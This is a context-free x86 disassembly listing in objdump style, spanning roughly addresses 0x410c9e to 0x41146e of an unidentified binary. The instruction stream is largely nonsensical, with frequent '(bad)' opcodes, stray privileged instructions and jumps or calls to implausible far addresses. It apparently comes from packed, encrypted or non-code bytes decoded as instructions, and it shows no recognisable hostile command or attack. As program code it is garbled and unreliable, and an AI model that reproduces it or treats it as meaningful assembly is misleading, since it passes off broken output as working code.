  410c9e:	xor    esi,DWORD PTR [ebx]
  410ca0:	mov    esi,DWORD PTR [ebx]
  410ca2:	sub    eax,DWORD PTR [ebx]
  410ca4:	add    eax,DWORD PTR [ebx]
  410ca6:	or     bl,dl
  410ca8:	dec    ebp
  410ca9:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410caf:	xor    eax,DWORD PTR [ebp-0xf00073]
  410cb5:	jb     0x410cfc
  410cb7:	add    BYTE PTR [ebx],dh
  410cb9:	dec    ebp
  410cba:	pop    esi
  410cbb:	mov    ebp,ebx
  410cbd:	cld    
  410cbe:	mov    esi,eax
  410cc0:	call   0x520f618d
  410cc5:	stc    
  410cc6:	add    eax,0x4572aa
  410ccb:	pop    edi
  410ccc:	leave  
  410ccd:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410cd4:	in     al,dx
  410cd5:	mov    eax,edi
  410cd7:	xor    eax,0xf8008520
  410cdd:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410ce4:	mov    eax,DWORD PTR [ebp-0x77]
  410ce7:	xor    bh,al
  410ce9:	pushf  
  410cea:	inc    ebp
  410ceb:	(bad)  
  410cec:	cmp    eax,ebp
  410cee:	pushf  
  410cef:	xchg   BYTE PTR [esi-0x8],dl
  410cf2:	mov    edi,0x8518e4ec
  410cf8:	jmp    0xf056:0x8b457df8
  410cff:	push   esp
  410d00:	push   esp
  410d01:	push   ecx
  410d02:	push   ecx
  410d03:	push   edi
  410d04:	xor    eax,esi
  410d06:	mov    edx,0x32729b
  410d0b:	add    ecx,eax
  410d0d:	mov    edx,edi
  410d0f:	clc    
  410d10:	retf   0xaf45
  410d13:	cmp    ebx,ebp
  410d15:	pushf  
  410d16:	mov    eax,edi
  410d18:	clc    
  410d19:	cld    
  410d1a:	jne    0x410d34
  410d1c:	xor    ebp,edx
  410d1e:	xor    eax,DWORD PTR [ebp+0x3]
  410d21:	or     BYTE PTR [ebx],al
  410d23:	add    BYTE PTR [ebp-0x7747475],al
  410d29:	hlt    
  410d2a:	dec    ebp
  410d2b:	dec    ebp
  410d2c:	je     0x410d61
  410d2e:	xor    esi,DWORD PTR [ebx]
  410d30:	xor    eax,DWORD PTR [ebx]
  410d32:	add    eax,DWORD PTR [ebx]
  410d34:	add    ecx,DWORD PTR [edi]
  410d36:	rol    ecx,cl
  410d38:	mov    esi,DWORD PTR [ecx]
  410d3a:	in     al,dx
  410d3b:	inc    ebp
  410d3c:	enter  0xca2b,0x33
  410d40:	icebp  
  410d41:	mov    DWORD PTR [edx],ecx
  410d43:	clc    
  410d44:	lock pop ebp
  410d46:	enter  0xf2e8,0xfe
  410d4a:	retf   0xeeff
  410d4d:	inc    ebp
  410d4e:	jne    0x410cdb
  410d50:	mov    edi,eax
  410d52:	cld    
  410d53:	dec    ebp
  410d54:	enter  0xbc89,0x8d
  410d58:	fwait
  410d59:	sti    
  410d5a:	xor    bh,bh
  410d5c:	mov    eax,DWORD PTR [ebp-0xc]
  410d5f:	mov    esi,DWORD PTR [ebp-0x4]
  410d62:	xor    eax,esi
  410d64:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9b]
  410d6b:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410d71:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410d77:	(bad)  
  410d78:	push   ebp
  410d79:	shr    esp,0x4d
  410d7c:	in     al,dx
  410d7d:	cmp    eax,DWORD PTR [esi+esi*2]
  410d80:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  410d86:	pushf  
  410d87:	mov    edi,0x85c7f445
  410d8d:	call   0xf886948a
  410d92:	xor    ebx,ebx
  410d94:	pushf  
  410d95:	popa   
  410d96:	push   ebx
  410d97:	dec    ebp
  410d98:	inc    ebp
  410d99:	mov    esi,DWORD PTR [eax]
  410d9b:	clc    
  410d9c:	pushf  
  410d9d:	into   
  410d9e:	mov    ecx,edi
  410da0:	in     al,dx
  410da1:	call   0x8b495364
  410da6:	pop    es
  410da7:	or     BYTE PTR [ebx],dh
  410da9:	or     BYTE PTR [edi+0x8a724d],bh
  410daf:	or     eax,edi
  410db1:	push   ebp
  410db2:	inc    ebp
  410db3:	cmpxchg8b (bad)
  410db4:	(bad)  
  410db5:	leave  
  410db6:	loopne 0x410d82
  410db8:	test   DWORD PTR [ebp-0x8],ecx
  410dbb:	mov    eax,DWORD PTR [ebp-0x18]
  410dbe:	rcl    DWORD PTR [ebp-0x29],1
  410dc1:	xor    eax,edi
  410dc3:	add    esi,eax
  410dc5:	and    eax,DWORD PTR [eax]
  410dc7:	mov    eax,DWORD PTR [eax]
  410dc9:	(bad)  
  410dca:	leave  
  410dcb:	sti    
  410dcc:	inc    ebp
  410dcd:	dec    DWORD PTR [ebx-0x39cc13ab]
  410dd3:	mov    esi,ecx
  410dd5:	clc    
  410dd6:	(bad)  
  410dd7:	dec    ebp
  410dd8:	iret   
  410dd9:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410ddf:	jb     0x410ddd
  410de1:	add    bh,al
  410de3:	inc    ebp
  410de4:	(bad)  
  410de5:	mov    eax,DWORD PTR [ebp-0xc]
  410de8:	(bad)  
  410de9:	xabort 0x65
  410dec:	loopne 0x410dbb
  410dee:	jmp    FWORD PTR [ebx]
  410df0:	mov    DWORD PTR [ebx],eax
  410df2:	clc    
  410df3:	lock inc ebp
  410df5:	dec    ebp
  410df6:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410dfc:	loopne 0x410e31
  410dfe:	inc    DWORD PTR [ebx]
  410e00:	mov    edi,DWORD PTR [ebx]
  410e02:	hlt    
  410e03:	jne    0x410e52
  410e05:	mov    esi,DWORD PTR [ebx]
  410e07:	in     al,0x8d
  410e09:	dec    ebp
  410e0a:	or     BYTE PTR [ebx],dh
  410e0c:	jb     0x410e11
  410e0e:	add    BYTE PTR [edi+0x45],bl
  410e11:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410e17:	add    BYTE PTR [ebx],dh
  410e19:	mov    esi,DWORD PTR [ebx]
  410e1b:	sub    DWORD PTR [ebx],0x6c
  410e1e:	mov    eax,DWORD PTR [ebp-0x4]
  410e21:	xor    eax,ecx
  410e23:	pushf  
  410e24:	mov    ecx,0x338545ba
  410e29:	clc    
  410e2a:	add    edx,DWORD PTR [ebp-0x77]
  410e2d:	mov    edi,eax
  410e2f:	adc    al,0x45
  410e31:	inc    ebp
  410e32:	xor    BYTE PTR [ebx-0x7f74eb64],cl
  410e38:	jmp    0x410e3b
  410e3a:	mov    eax,DWORD PTR [eax]
  410e3c:	loopne 0x410e8b
  410e3e:	inc    ebp
  410e3f:	mov    esi,DWORD PTR [ebx]
  410e41:	mov    eax,DWORD PTR [ebx]
  410e43:	nop
  410e44:	rol    DWORD PTR [eax],cl
  410e46:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  410e4c:	mov    cl,BYTE PTR [ecx+0x450bf888]
  410e52:	dec    ebp
  410e53:	push   esi
  410e54:	mov    edi,DWORD PTR [edi+0x7b608f8]
  410e5a:	xor    eax,edi
  410e5c:	mov    DWORD PTR [ebx+0x34d3208],ebx
  410e62:	mov    ecx,DWORD PTR [ecx+0x45ceec08]
  410e68:	iret   
  410e69:	xor    ecx,edx
  410e6b:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  410e72:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  410e78:	dec    ebp
  410e79:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  410e7f:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9b]
  410e86:	mov    DWORD PTR [ecx+0x8],eax
  410e89:	mov    eax,DWORD PTR [ebp-0x8]
  410e8c:	xor    ebx,DWORD PTR [eax]
  410e8e:	mov    ecx,0xff8b8d40
  410e93:	clc    
  410e94:	enter  0x4d49,0x48
  410e98:	mov    eax,edx
  410e9a:	lock enter 0x4545,0x8b
  410e9f:	mov    esi,eax
  410ea1:	cmp    dh,al
  410ea3:	rol    edi,0x3
  410ea6:	enter  0x9140,0x89
  410eaa:	inc    ebp
  410eab:	adc    al,0x8b
  410ead:	inc    ebp
  410eae:	clc    
  410eaf:	xor    eax,esi
  410eb1:	add    eax,edi
  410eb3:	mov    DWORD PTR [esi-0x24],ebx
  410eb6:	rol    DWORD PTR [ebp-0x37],0x33
  410eba:	add    al,0x3
  410ebc:	push   ebp
  410ebd:	mov    esp,ebp
  410ebf:	fsubr  st,st(4)
  410ec1:	inc    ebp
  410ec2:	(bad)  
  410ec3:	mov    edi,esp
  410ec5:	adc    BYTE PTR [ebp+0x32c3f8c7],al
  410ecb:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  410ed2:	inc    ebp
  410ed3:	test   DWORD PTR [ecx+0x454514f8],ecx
  410ed9:	cmp    al,0x8b
  410edb:	pushf  
  410edc:	nop
  410edd:	mov    DWORD PTR [eax],0x14858bd8
  410ee3:	clc    
  410ee4:	add    BYTE PTR [ebp-0x74feff77],al
  410eea:	add    ah,bh
  410eec:	or     edi,eax
  410eee:	dec    eax
  410eef:	ret    
  410ef0:	push   ebx
  410ef1:	inc    ebp
  410ef2:	dec    ebp
  410ef3:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  410ef9:	mov    DWORD PTR [esp+ebp*8+0x51],edx
  410efd:	jne    0x410f32
  410eff:	mov    edi,DWORD PTR [ebx+0x4d720c]
  410f05:	call   0xff8700cd
  410f0a:	mov    eax,DWORD PTR [ebp-0x4]
  410f0d:	mov    edi,0x4585c3d8
  410f13:	clc    
  410f14:	mov    eax,DWORD PTR [ebp-0x8]
  410f17:	xor    eax,DWORD PTR [eax+0x3]
  410f1a:	adc    DWORD PTR [eax+0xc],0x45
  410f1e:	inc    ebp
  410f1f:	push   eax
  410f20:	mov    ebx,ebp
  410f22:	clc    
  410f23:	inc    DWORD PTR [eax-0x75]
  410f26:	mov    esi,eax
  410f28:	clc    
  410f29:	rol    BYTE PTR [ebp+0x4545544e],0x33
  410f30:	je     0x410f35
  410f32:	mov    edx,DWORD PTR [eax+0x38]
  410f35:	jne    0x410f84
  410f37:	lea    ecx,[ebx-0x817ab44]
  410f3d:	mul    BYTE PTR [ebx]
  410f3f:	dec    DWORD PTR [ebx+0x4089f845]
  410f45:	fadd   DWORD PTR [ebx]
  410f47:	inc    ebp
  410f48:	jmp    0x410ed5
  410f4a:	mov    ecx,DWORD PTR [esp+edx*2]
  410f4d:	rol    DWORD PTR [ebp+0x45],0x8b
  410f51:	mov    edi,esp
  410f53:	lock (bad) 
  410f55:	dec    ebp
  410f56:	ret    
  410f57:	mov    eax,DWORD PTR [ebp+0x10]
  410f5a:	mov    eax,DWORD PTR [ecx-0x4]
  410f5d:	mov    eax,edi
  410f5f:	fadd   st,st(3)
  410f61:	enter  0x1645,0x8b
  410f65:	inc    ebp
  410f66:	cld    
  410f67:	mov    ecx,DWORD PTR [ebp+0xc]
  410f6a:	xor    ecx,DWORD PTR [ebp+0x3]
  410f6d:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  410f73:	sub    eax,DWORD PTR [ebp-0x17]
  410f76:	xor    eax,DWORD PTR [edx]
  410f78:	pushf  
  410f79:	add    bh,al
  410f7b:	or     al,0xd8
  410f7d:	jne    0x410f04
  410f7f:	(bad)  
  410f80:	clc    
  410f81:	mov    al,0x45
  410f83:	call   0xffde05c5
  410f88:	jmp    0xdd12be
  410f8d:	mov    DWORD PTR [ebp-0x30],eax
  410f90:	xor    eax,DWORD PTR [ebp+0x3]
  410f93:	xor    cl,BYTE PTR [ecx+0x45c7f49c]
  410f99:	enter  0x8503,0xc
  410f9d:	clc    
  410f9e:	inc    ebp
  410f9f:	inc    ebp
  410fa0:	(bad)  
  410fa1:	cmp    al,0xec
  410fa3:	pushf  
  410fa4:	jne    0x410f33
  410fa6:	mov    edx,eax
  410fa8:	clc    
  410fa9:	dec    ebp
  410faa:	out    dx,eax
  410fab:	(bad)  
  410fac:	dec    esp
  410fae:	mov    DWORD PTR [ebp-0x10],ecx
  410fb1:	lea    eax,[ebp-0x38]
  410fb4:	cmp    DWORD PTR [ebp-0x64],ecx
  410fb7:	lea    ecx,[ebx-0x38b2273c]
  410fbd:	mov    eax,ebx
  410fbf:	cld    
  410fc0:	(bad)  
  410fc1:	iret   
  410fc2:	mov    esp,0xf74de8cb
  410fc7:	jmp    0x8611cb
  410fcc:	test   DWORD PTR [ebx],esi
  410fce:	je     0x410f6c
  410fd0:	mov    ecx,DWORD PTR [edi]
  410fd2:	fdivr  st,st(6)
  410fd4:	mov    DWORD PTR [eax],0xe8ff8bc3
  410fda:	lock iret 
  410fdc:	inc    ebp
  410fdd:	lock push eax
  410fdf:	retf   
  410fe0:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  410fe7:	test   DWORD PTR [ebp-0x7c],0x32d89b8b
  410fee:	dec    ebp
  410fef:	mov    DWORD PTR [ebx],ebp
  410ff1:	fmul   DWORD PTR [ecx+0x458bd845]
  410ff7:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  410ffd:	enter  0x1303,0xc
  411001:	inc    ebp
  411002:	dec    ebp
  411003:	xor    edi,DWORD PTR [ebx]
  411005:	add    esi,DWORD PTR [edx+0x50]
  411008:	mov    ecx,DWORD PTR [eax+esi*8]
  41100b:	inc    ebp
  41100c:	inc    eax
  41100d:	push   eax
  41100e:	mov    ebp,esp
  411010:	lock inc DWORD PTR [ecx-0x75]
  411014:	mov    esp,esp
  411016:	fadd   DWORD PTR [eax]
  411018:	rol    edi,0xee
  41101b:	test   BYTE PTR [eax],al
  41101d:	dec    ebx
  41101e:	push   0x32
  411020:	dec    DWORD PTR [ebx-0x30ba0314]
  411026:	push   eax
  411027:	mov    dh,0x21
  411029:	add    edi,edi
  41102b:	cmp    edi,DWORD PTR [eax-0x7877af1]
  411031:	add    BYTE PTR [ebp-0x75],al
  411034:	(bad)  
  411035:	loopne 0x411003
  411037:	add    BYTE PTR [ebp+0x4584f8c7],al
  41103d:	dec    ebx
  41103e:	xor    esi,DWORD PTR [edx]
  411040:	pushf  
  411041:	mov    eax,edi
  411043:	cld    
  411044:	(bad)  
  411045:	iret   
  411046:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41104c:	mov    DWORD PTR [edi],ecx
  41104e:	in     al,0x58
  411050:	dec    ebp
  411051:	add    BYTE PTR [ecx+0x4df0e08b],cl
  411057:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41105d:	dec    ebx
  41105e:	mov    DWORD PTR [edx],esi
  411060:	fmul   QWORD PTR [ebx-0x30cc03b3]
  411066:	add    esi,DWORD PTR [esi+0x3bd80389]
  41106c:	test   DWORD PTR [edi],0x3d3800
  411072:	test   DWORD PTR [ebx+0x84dcf8],ecx
  411078:	add    edi,eax
  41107a:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  411081:	mov    eax,DWORD PTR [ebx]
  411083:	cld    
  411084:	mov    edi,ecx
  411086:	hlt    
  411087:	mov    dh,0x45
  411089:	add    esi,DWORD PTR [ebx]
  41108b:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  411091:	add    BYTE PTR [eax],al
  411093:	mov    eax,DWORD PTR [ebp-0x20]
  411096:	mov    eax,DWORD PTR [eax]
  411098:	call   0x33c55e64
  41109d:	dec    ebx
  41109e:	add    esi,DWORD PTR [edx]
  4110a0:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  4110a6:	cld    
  4110a7:	iret   
  4110a8:	(bad)  
  4110a9:	mov    ebx,es
  4110ab:	dec    ebx
  4110ac:	push   0x32
  4110ae:	lea    esi,[edx]
  4110b0:	mov    al,0x8b
  4110b2:	call   0xff4b0ba7
  4110b7:	iret   
  4110b8:	inc    ebp
  4110b9:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4110bf:	or     al,BYTE PTR ds:0xe4728b
  4110c5:	or     DWORD PTR [ebp-0x31],ecx
  4110c8:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  4110cf:	cmp    al,cl
  4110d1:	je     0x4112ab
  4110d7:	mov    eax,DWORD PTR [ebp-0x10]
  4110da:	mov    eax,DWORD PTR [eax]
  4110dc:	xor    eax,edi
  4110de:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4110e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4110e8:	xor    ecx,DWORD PTR [ecx]
  4110ea:	bswap  edi
  4110ec:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  4110f4:	add    DWORD PTR [ebx+0x945dc00],ecx
  4110fa:	mov    ecx,edi
  4110fc:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411103:	or     al,BYTE PTR [eax]
  411105:	mov    ecx,DWORD PTR [ebp-0x20]
  411108:	xor    ecx,DWORD PTR [ecx]
  41110a:	bswap  edi
  41110c:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  411114:	add    DWORD PTR [edi],ecx
  411116:	add    BYTE PTR [eax-0x7474ffbb],dl
  41111c:	xor    ebx,esp
  41111e:	mov    al,BYTE PTR [eax]
  411120:	add    eax,0x8472c7
  411125:	dec    ebx
  411126:	dec    ebp
  411127:	xor    dh,BYTE PTR [ebx]
  411129:	mov    ecx,DWORD PTR [edi]
  41112b:	lock ror BYTE PTR [ecx],0xcb
  41112f:	iret   
  411130:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  411138:	inc    ebp
  411139:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41113f:	iret   
  411140:	add    eax,0x4b728c
  411145:	xor    cl,BYTE PTR [ebp+0xa]
  411148:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41114e:	or     eax,0x8c72cf
  411153:	dec    edi
  411154:	shl    DWORD PTR [edx],0x4d
  411157:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41115d:	fmul   QWORD PTR ds:0xc77200
  411163:	test   cl,al
  411165:	dec    ebx
  411166:	dec    ebp
  411167:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41116d:	or     DWORD PTR ds:0x8c72cf,ecx
  411173:	dec    ebx
  411174:	enter  0x8532,0x32
  411178:	add    BYTE PTR [ebx+0x945e000],cl
  41117e:	mov    ecx,edi
  411180:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411187:	or     al,BYTE PTR [eax]
  411189:	mov    ecx,DWORD PTR [ebp-0x24]
  41118c:	mov    ecx,DWORD PTR [ecx]
  41118e:	xor    ecx,edi
  411190:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  411197:	cmp    al,cl
  411199:	jne    0x4111e8
  41119b:	lea    ecx,[ebx-0x7517cc50]
  4111a1:	sti    
  4111a2:	or     eax,0x4d72ff
  4111a7:	cmp    eax,ecx
  4111a9:	je     0x4111f8
  4111ab:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  4111b1:	ret    
  4111b2:	or     eax,0x8b7245
  4111b7:	call   0x84c6d984
  4111bc:	add    BYTE PTR [ebx+0x33453200],bl
  4111c2:	mov    ecx,DWORD PTR [ebx+0x558afc33]
  4111c8:	add    eax,0x37233
  4111cd:	cmp    ecx,DWORD PTR [ebp+0xf]
  4111d0:	mov    esi,edi
  4111d2:	xor    edi,edi
  4111d4:	mov    cl,BYTE PTR [ebx+0x4d72fc0d]
  4111da:	add    BYTE PTR [ebx],dh
  4111dc:	rol    DWORD PTR [ebx],0x4d
  4111df:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  4111e5:	call   0x33b35ef7
  4111ea:	add    BYTE PTR [ebp+0x724d08c1],cl
  4111f0:	mov    eax,DWORD PTR [eax]
  4111f2:	xor    esi,DWORD PTR [edi-0x76]
  4111f5:	sbb    BYTE PTR ds:0x8d7275,cl
  4111fb:	cwde   
  4111fc:	enter  0x50e8,0xf3
  411200:	inc    ebp
  411201:	dec    DWORD PTR [ebx-0x7574ccbb]
  411207:	fadd   DWORD PTR ds:0xc372c7
  41120d:	ror    DWORD PTR [ebp+0x13],0x8b
  411211:	inc    ebp
  411212:	xor    esi,DWORD PTR [ebx]
  411214:	mov    al,BYTE PTR [ebx]
  411216:	or     eax,0x187250
  41121b:	inc    ebp
  41121c:	rcl    DWORD PTR [eax+0x4d],0xdc
  411220:	mov    edi,edi
  411222:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  411228:	jb     0x4111b3
  41122a:	add    ah,bl
  41122c:	shl    DWORD PTR [ebp+0x4d],0xff
  411230:	mov    ebx,esp
  411232:	xor    eax,DWORD PTR [ebp-0x76]
  411235:	add    ecx,DWORD PTR ds:0xe87208
  41123b:	repz enter 0x10ff,0x45
  411240:	inc    ebp
  411241:	mov    edx,DWORD PTR [eax-0x28]
  411244:	xor    bh,al
  411246:	inc    ebx
  411248:	mov    eax,ecx
  41124a:	mov    eax,0xa00c111
  41124f:	jne    0x411296
  411251:	mov    esi,DWORD PTR [ebx]
  411253:	test   al,0x3
  411255:	inc    ebp
  411256:	mov    DWORD PTR [eax-0xc],edx
  411259:	mov    ds:0x8b33ff45,al
  41125e:	lea    edx,[eax]
  411260:	xor    BYTE PTR [ebp+0x72],cl
  411263:	add    DWORD PTR [eax],eax
  411265:	mov    eax,edi
  411267:	lods   al,BYTE PTR ds:[esi]
  411268:	dec    ebp
  411269:	inc    ebp
  41126a:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  411270:	retf   
  411271:	mov    edx,ecx
  411273:	adc    al,0x84
  411275:	(bad)  
  411276:	std    
  411277:	ret    
  411278:	jmp    FWORD PTR [edi-0x37474bb]
  41127e:	hlt    
  41127f:	push   ebp
  411280:	(bad)  
  411281:	xor    eax,ebx
  411283:	(bad)  
  411284:	enter  0x1111,0x72
  411288:	inc    ebp
  411289:	add    BYTE PTR [ebx-0x387deb3f],cl
  41128f:	cld    
  411290:	test   bh,bh
  411292:	fwait
  411293:	inc    ebp
  411294:	xor    bl,BYTE PTR [edi-0x15]
  411297:	pop    ebx
  411298:	push   0xffffffc2
  41129a:	inc    DWORD PTR [eax]
  41129c:	in     al,dx
  41129d:	mov    eax,DWORD PTR [ebp+0x51]
  4112a0:	push   eax
  4112a1:	inc    ebp
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	mov    edi,edi
  4112a5:	or     BYTE PTR [ebx+0x4d80fc16],cl
  4112ab:	add    DWORD PTR [ebx],esi
  4112ad:	add    BYTE PTR [ebx],al
  4112af:	add    BYTE PTR [ebx],bh
  4112b1:	icebp  
  4112b2:	je     0x4112bc
  4112b4:	mov    eax,DWORD PTR [edi]
  4112b6:	cld    
  4112b7:	rol    edi,0x72
  4112ba:	ret    
  4112bb:	add    BYTE PTR [edx-0x2f],ch
  4112be:	lea    edx,[eax]
  4112c0:	cwde   
  4112c1:	jne    0x4112ab
  4112c3:	(bad)  
  4112c4:	clc    
  4112c5:	or     al,0xff
  4112c7:	inc    DWORD PTR [ebp-0x18]
  4112ca:	cmp    ebx,0x18
  4112cd:	inc    DWORD PTR [ebp+0x6]
  4112d0:	call   FWORD PTR [ebp-0x54]
  4112d3:	or     al,0x75
  4112d5:	push   ebp
  4112d6:	mov    ebp,esp
  4112d8:	test   al,0x53
  4112da:	inc    ebp
  4112db:	mov    edx,DWORD PTR [eax-0x75]
  4112de:	imul   ecx,DWORD PTR [eax],0xffffffff
  4112e1:	dec    ebp
  4112e2:	mov    edx,DWORD PTR [edi-0x4]
  4112e5:	push   esp
  4112e6:	dec    ebp
  4112e7:	push   ecx
  4112e8:	xor    esi,DWORD PTR [ebx]
  4112ea:	add    edi,DWORD PTR [edi+0x74723b]
  4112f0:	push   0xffffffc7
  4112f2:	inc    DWORD PTR [ecx]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	inc    ebp
  4112f6:	inc    ebp
  4112f7:	mov    eax,DWORD PTR [ebx]
  4112f9:	xchg   esp,eax
  4112fa:	or     BYTE PTR [eax],al
  4112fc:	call   0xffcd0b8c
  411301:	adc    al,0x45
  411303:	or     BYTE PTR [ebx+0x800ac01],0x0
  41130a:	inc    ebp
  41130b:	inc    ecx
  41130c:	add    ecx,DWORD PTR [ebx-0x76baebec]
  411312:	mov    eax,DWORD PTR [ecx]
  411314:	call   0x338a6019
  411319:	push   0x3
  41131b:	push   0xc1300f
  411320:	dec    ebp
  411321:	jo     0x4112ae
  411323:	push   0xffffffd4
  411325:	dec    edi
  411327:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf765],ecx
  41132e:	cmp    eax,edi
  411330:	cmovne edx,DWORD PTR [edi-0x75]
  411334:	call   DWORD PTR [eax]
  411336:	mov    eax,DWORD PTR [ebp+0x8]
  411339:	call   FWORD PTR [esi+0x14]
  41133c:	leave  
  41133d:	inc    ebp
  41133e:	adc    BYTE PTR [eax+0x55],dl
  411341:	jne    0x41132f
  411343:	call   0xff5212d3
  411348:	dec    ebp
  411349:	inc    ebp
  41134a:	mov    ecx,DWORD PTR [ebx+0x390338b]
  411350:	add    BYTE PTR [ebx],bh
  411352:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  411356:	push   esp
  411357:	or     al,0x51
  411359:	dec    ebp
  41135a:	xor    DWORD PTR [ebx],0xf32039b
  411360:	cmp    eax,DWORD PTR [ebp+0x74]
  411363:	mov    edi,edi
  411365:	pop    edi
  411366:	adc    BYTE PTR [ebx+0x75],bl
  411369:	ret    0x50
  41136c:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  411370:	(bad)  
  411371:	clc    
  411372:	mov    esp,ebp
  411374:	pop    ecx
  411375:	mov    ecx,0xf80085c2
  41137a:	mov    ecx,DWORD PTR [ecx+edx*2]
  41137d:	push   esi
  41137e:	push   esi
  41137f:	(bad)  
  411380:	lock add DWORD PTR [ebp+0x44],eax
  411384:	mov    edx,DWORD PTR [eax]
  411386:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41138a:	or     BYTE PTR [edi+eax*1+0x51],dl
  41138e:	ret    
  41138f:	xor    ebx,DWORD PTR [ebx+0x37232be]
  411395:	add    BYTE PTR [ecx+0x147c8bfe],cl
  41139b:	or     al,0x80
  41139d:	jge    0x4113a0
  41139f:	mov    DWORD PTR [eax],eax
  4113a1:	and    al,0x8
  4113a3:	cmp    DWORD PTR [ebp+0x10],eax
  4113a6:	mov    edx,DWORD PTR [esi]
  4113a8:	xchg   esp,eax
  4113a9:	dec    esp
  4113aa:	add    BYTE PTR [eax],dl
  4113ac:	mov    ecx,edx
  4113ae:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4113b2:	dec    ebp
  4113b3:	into   
  4113b4:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4113ba:	mov    edx,DWORD PTR [eax+0x14]
  4113bd:	das    
  4113be:	add    al,0x45
  4113c0:	add    BYTE PTR [ebp+0x0],dh
  4113c3:	mov    edi,edi
  4113c5:	and    al,0x50
  4113c7:	mov    eax,DWORD PTR [eax]
  4113c9:	and    al,0xd1
  4113cb:	xor    eax,DWORD PTR [esi]
  4113cd:	lea    eax,[ebp+0x8]
  4113d0:	xor    esi,DWORD PTR [edx+0x3]
  4113d3:	add    BYTE PTR [ecx+0x4510fc44],cl
  4113d9:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4113df:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4113e9:	cmp    al,0xff
  4113eb:	pushf  
  4113ec:	mov    edi,edi
  4113ee:	or     BYTE PTR [esi+ecx*1],cl
  4113f1:	jne    0x4113b6
  4113f3:	call   0xa13bf
  4113f8:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4113fc:	mov    ebx,DWORD PTR [eax]
  4113fe:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  411402:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41140a:	pop    esi
  41140b:	dec    ecx
  41140d:	and    al,0x10
  41140f:	call   DWORD PTR [ebp+0x24]
  411412:	in     al,dx
  411413:	call   0xffc512fc
  411418:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41141c:	pushf  
  41141d:	pop    esi
  41141e:	mov    ebp,esp
  411420:	and    al,0xc2
  411422:	push   edi
  411423:	add    BYTE PTR [ecx+0x33],al
  411426:	mov    DWORD PTR [ebp+0x24],esi
  411429:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41142f:	dec    DWORD PTR [eax]
  411431:	and    al,0x7
  411433:	(bad)  
  411434:	cli    
  411435:	and    al,0x9b
  411437:	or     BYTE PTR [edx],dh
  411439:	sbb    BYTE PTR [ebx],al
  41143b:	adc    al,0x89
  41143d:	jmp    DWORD PTR [esp]
  411440:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  411446:	adc    al,0x8
  411448:	dec    ebp
  411449:	adc    BYTE PTR [ebp-0x7c],dh
  41144c:	mov    esi,DWORD PTR [edx]
  41144e:	and    al,0x24
  411450:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  411456:	add    edi,eax
  411458:	pcmpeqb mm1,mm2
  41145b:	jmp    0x4114a9
  41145d:	dec    DWORD PTR [eax]
  41145f:	je     0x41144c
  411461:	mov    edi,DWORD PTR [ecx]
  411463:	pop    ebp
  411464:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  411468:	fwait
  411469:	mov    DWORD PTR [eax-0x8],ebp
  41146c:	jge    0x4114d6
  41146e:	dec    DWORD PTR [ecx+0x5fbf7424]
